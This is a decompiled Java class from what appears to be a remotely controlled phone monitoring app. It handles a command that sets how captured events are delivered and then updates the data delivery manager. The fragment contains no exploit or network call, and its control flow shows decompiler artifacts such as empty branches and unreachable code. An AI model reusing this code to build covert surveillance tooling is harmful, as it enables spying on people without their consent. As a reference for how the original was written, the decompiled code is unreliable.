package com.vvt.appengine.a;

import com.vvt.appengine.AppEngine1;
import com.vvt.base.FxDeliveryMethod;
import com.vvt.preference.FxPreferenceType;
import com.vvt.preference.PrefEventsCapture;
import com.vvt.remotecontrol.ControlCommand;

public class bn
{
  private static final boolean a = a.a;
  private static final boolean b = a.e;
  
  public boolean a(ControlCommand paramControlCommand, AppEngine1 paramh)
  {
    com.vvt.preference.b localb = paramh.n;
    Object localObject1 = FxPreferenceType.EVENTS_CTRL;
    localObject1 = (PrefEventsCapture)localb.a((FxPreferenceType)localObject1);
    Object localObject2 = paramControlCommand.getData();
    boolean bool1 = localObject2 instanceof Integer;
    if (bool1)
    {
      localObject2 = (Integer)localObject2;
      int i = ((Integer)localObject2).intValue();
      bool1 = a;
      if (bool1) {}
      localObject2 = FxDeliveryMethod.getFromIndex(i);
      ((PrefEventsCapture)localObject1).setDeliveryMethod((FxDeliveryMethod)localObject2);
      localb.b();
      localObject1 = paramh.g;
      ((com.vvt.datadeliverymanager.b)localObject1).a((FxDeliveryMethod)localObject2);
    }
    for (;;)
    {
      return true;
      boolean bool2 = b;
      if (!bool2) {}
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/bn.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */